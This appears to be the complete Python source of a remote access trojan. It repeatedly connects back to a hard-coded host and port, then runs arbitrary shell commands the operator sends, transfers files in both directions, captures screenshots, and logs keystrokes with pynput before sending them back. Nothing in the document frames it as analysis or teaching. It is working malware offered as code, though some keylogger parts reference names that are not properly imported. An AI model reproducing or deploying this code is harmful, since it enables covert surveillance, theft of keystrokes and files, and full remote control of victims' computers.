import socket, time, subprocess, json, os, getpass, pyautogui, pynput, pynput.keyboard
from threading import Thread
def main() :
    def reliable_send(data):
            jsondata = json.dumps(data)
            s.send(jsondata.encode())

    def reliable_recv():
            data = ''
            while True:
                    try:
                            data = data + s.recv(1024).decode().rstrip()
                            return json.loads(data)
                    except ValueError:
                            continue

    def keyl() :
        print("here")
        keys = [""]
        def on_press(key):
        
            try:
            #print(key)
                
            
                keys.append(key.char)
            
            except AttributeError:
                if key == keyboard.Key.backspace :
                    keys.append("<backspace>")
                if key == keyboard.Key.space :
                    keys.append("<space>")
                pass

        def on_release(key):
        #print('{0} released'.format(key))
            if key == keyboard.Key.esc:
        
            # Stop listener
                reliable_send(keys)
                t1.terminate()
                return False

                

    # Collect events until released
        with keyboard.Listener(
                on_press=on_press,
                on_release=on_release) as listener:
            listener.join()
    def keyl_stop() :

        k = Controller()
        k.press(Key.esc)
        k.release(Key.esc)
        t2.terminate()

    def screenshot() :

        im = pyautogui.screenshot()
        user = getpass.getuser()
        im.save(f"C:/Users/"+ str(user)+"/img.png")
        f = open("C:/Users/"+ str(user)+"/img.png", 'rb')
        s.send(f.read())
        f.close()
        os.remove(f"C:/Users/"+ str(user)+"/img.png")
    def connection():
        while True:
            time.sleep(20)
            try:
                s.connect(('192.168.1.2',5555))
                shell()
                s.close()
                break
            except:
                connection()

    def upload_file(file_name):
        f = open(file_name, 'rb')
        s.send(f.read())


    def download_file(file_name):
            f = open(file_name, 'wb')
            s.settimeout(5)
            chunk = s.recv(1024)
            while chunk:
                    f.write(chunk)
                    try:
                            chunk = s.recv(1024)
                    except socket.timeout as e:
                            break
            s.settimeout(None)
            f.close()


    def shell():

        while True:
            t1 = Thread(target=keyl)
            t2 = Thread(target=keyl_stop)
            command = reliable_recv()
            if command == 'quit':
                break
            elif command == 'clear':
                pass
            elif command[:3] == 'cd ':
                os.chdir(command[3:])
            elif command[:8] == 'download':
                upload_file(command[9:])
            elif command[:6] == 'upload':
                download_file(command[7:])
            elif command == 'screenshot':
                screenshot()
            elif command == 'keys' :
                t1.start()
                
            elif command == 'keys_stop' :
                t2.start()
            else:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(result)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection()
main()
